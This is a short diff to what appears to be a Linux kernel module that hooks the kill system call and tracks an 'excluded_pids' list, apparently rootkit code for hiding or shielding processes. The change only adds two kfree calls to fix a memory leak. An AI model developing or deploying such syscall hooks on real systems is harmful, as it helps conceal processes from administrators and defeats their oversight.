@@ -50,6 +50,7 @@ static asmlinkage int kill_hook(const struct pt_regs * regs) {
             list_del(&target->list);
             kfree(target->data);
             kfree(target);
+            kfree(strpid);
         } else {
 	        append_node(&excluded_pids, strpid);
         }
@@ -89,6 +90,7 @@ static asmlinkage int kill_hook(pid_t pid, int sig) {
             list_del(&target->list);
             kfree(target->data);
             kfree(target);
+            kfree(strpid);
         } else {
 	        append_node(&excluded_pids, strpid);
         }
